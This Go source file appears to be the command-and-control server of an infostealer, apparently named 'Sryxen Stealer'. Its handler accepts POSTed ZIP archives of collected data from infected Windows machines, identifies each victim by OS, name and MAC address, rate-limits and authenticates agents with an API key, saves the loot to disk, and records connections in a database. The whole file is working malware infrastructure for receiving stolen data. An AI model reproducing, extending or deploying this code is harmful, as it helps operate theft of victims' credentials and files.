package AgentHandler

import (
	"archive/zip"
	"bytes"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"SryxenStealerC2/database"
	apiKey "SryxenStealerC2/api-key"
)

type Error struct {
	ErrorCode    int    `json:"error_code"`
	ErrorMessage string `json:"error_message"`
}

type ConnectionSuccess struct {
	ID string `json:"id"`
}

const (
	rateLimitDuration = time.Hour
	maxFileSize       = 25 * 1024 * 1024
	uploadDir         = "uploads"
)

var rateLimitMap sync.Map 

func sendJSONResponse(w http.ResponseWriter, statusCode int, payload interface{}) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(statusCode)
	if err := json.NewEncoder(w).Encode(payload); err != nil {
		fmt.Printf("Failed to send JSON response: %v\n", err)
	}
}

func isRateLimited(clientIP string) bool {
	if lastRequest, ok := rateLimitMap.Load(clientIP); ok {
		if time.Since(lastRequest.(time.Time)) < rateLimitDuration {
			return true 
		}
	}
	rateLimitMap.Store(clientIP, time.Now())
	return false
}

func validateHeaders(r *http.Request) (string, string, string, error) {
	OS := r.Header.Get("OS")
	Name := r.Header.Get("Name")
	MACAddress := r.Header.Get("MAC_Address")

	if OS == "" || Name == "" || MACAddress == "" {
		return "", "", "", errors.New("missing required headers: OS, Name, or MAC_Address")
	}

	if !strings.Contains(strings.ToLower(OS), "windows") {
		return "", "", "", errors.New("only Windows OS is allowed")
	}

	return OS, Name, MACAddress, nil
}
// to not get panics.
func generateCustomID(OS, Name, MACAddress string) string {
	safeSlice := func(input string) string {
		if len(input) < 8 {
			return input
		}
		return input[:8]
	}

	return safeSlice(base64.RawURLEncoding.EncodeToString([]byte(MACAddress))) + "." +
		safeSlice(base64.RawURLEncoding.EncodeToString([]byte(OS))) + "." +
		safeSlice(base64.RawURLEncoding.EncodeToString([]byte(Name)))
}


func processAndSaveZip(buffer *bytes.Buffer, zipFilePath string) error {
	reader, err := zip.NewReader(bytes.NewReader(buffer.Bytes()), int64(buffer.Len()))
	if err != nil {
		return errors.New("the uploaded file is not a valid ZIP file")
	}

	for _, file := range reader.File {
		if strings.Contains(file.Name, "..") || filepath.IsAbs(file.Name) {
			return fmt.Errorf("invalid file path: %s", file.Name)
		}
	}

	if err := os.MkdirAll(filepath.Dir(zipFilePath), 0755); err != nil {
		return errors.New("failed to create directory for storing the file")
	}

	zipFile, err := os.Create(zipFilePath)
	if err != nil {
		return errors.New("failed to save the ZIP file")
	}
	defer zipFile.Close()

	if _, err := zipFile.Write(buffer.Bytes()); err != nil {
		return errors.New("failed to write the ZIP file to disk")
	}

	return nil
}


func LogAgentData(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		sendJSONResponse(w, http.StatusMethodNotAllowed, Error{
			ErrorCode:    http.StatusMethodNotAllowed,
			ErrorMessage: "POST is the only accepted method for this endpoint.",
		})
		return
	}

	clientIP := r.RemoteAddr
	fmt.Printf("Received request from IP: %s\n", clientIP)

	if isRateLimited(clientIP) {
		sendJSONResponse(w, http.StatusTooManyRequests, Error{
			ErrorCode:    http.StatusTooManyRequests,
			ErrorMessage: "Rate limit exceeded. Please try again after one hour.",
		})
		return
	}

	if !apiKey.ValidateAPIKey(r) {
		sendJSONResponse(w, http.StatusUnauthorized, Error{
			ErrorCode:    http.StatusUnauthorized,
			ErrorMessage: "Invalid or missing API key.",
		})
		return
	}


	OS, Name, MACAddress, err := validateHeaders(r)
	if err != nil {
		sendJSONResponse(w, http.StatusForbidden, Error{
			ErrorCode:    http.StatusForbidden,
			ErrorMessage: err.Error(),
		})
		return
	}

	CustomID := generateCustomID(OS, Name, MACAddress)

	if database.GetConnectionData(CustomID) != "" {
		sendJSONResponse(w, http.StatusForbidden, Error{
			ErrorCode:    http.StatusForbidden,
			ErrorMessage: "Please send another heartbeat before creating a new connection request.",
		})
		return
	}

	file, fileHeader, err := r.FormFile("file")
	if err != nil {
		sendJSONResponse(w, http.StatusBadRequest, Error{
			ErrorCode:    http.StatusBadRequest,
			ErrorMessage: "Failed to retrieve the file from the request body.",
		})
		return
	}
	defer file.Close()

	if fileHeader.Size <= 0 {
		sendJSONResponse(w, http.StatusBadRequest, Error{
			ErrorCode:    http.StatusBadRequest,
			ErrorMessage: "Uploaded file is empty.",
		})
		return
	}
	if fileHeader.Size > maxFileSize {
		sendJSONResponse(w, http.StatusRequestEntityTooLarge, Error{
			ErrorCode:    http.StatusRequestEntityTooLarge,
			ErrorMessage: "The uploaded file exceeds the maximum allowed size of 25MB.",
		})
		return
	}

	buffer := new(bytes.Buffer)
	if _, err := io.Copy(buffer, file); err != nil {
		sendJSONResponse(w, http.StatusInternalServerError, Error{
			ErrorCode:    http.StatusInternalServerError,
			ErrorMessage: "Error reading the file content.",
		})
		return
	}

	zipFilePath := filepath.Join(uploadDir, CustomID+".zip")
	if err := processAndSaveZip(buffer, zipFilePath); err != nil {
		sendJSONResponse(w, http.StatusBadRequest, Error{
			ErrorCode:    http.StatusBadRequest,
			ErrorMessage: err.Error(),
		})
		return
	}

	if !database.ConnectionNew(CustomID) {
		sendJSONResponse(w, http.StatusInternalServerError, Error{
			ErrorCode:    http.StatusInternalServerError,
			ErrorMessage: "A database error occurred while trying to insert the document.",
		})
		return
	}

	sendJSONResponse(w, http.StatusOK, ConnectionSuccess{ID: CustomID})
}

func GetAgents() ([]string, error) {
	agents, err := database.GetAllAgents()
	if err != nil {
		return nil, err
	}

	agentIDs := make([]string, len(agents))
	for i, agent := range agents {
		agentIDs[i] = agent.ID
	}

	return agentIDs, nil
}
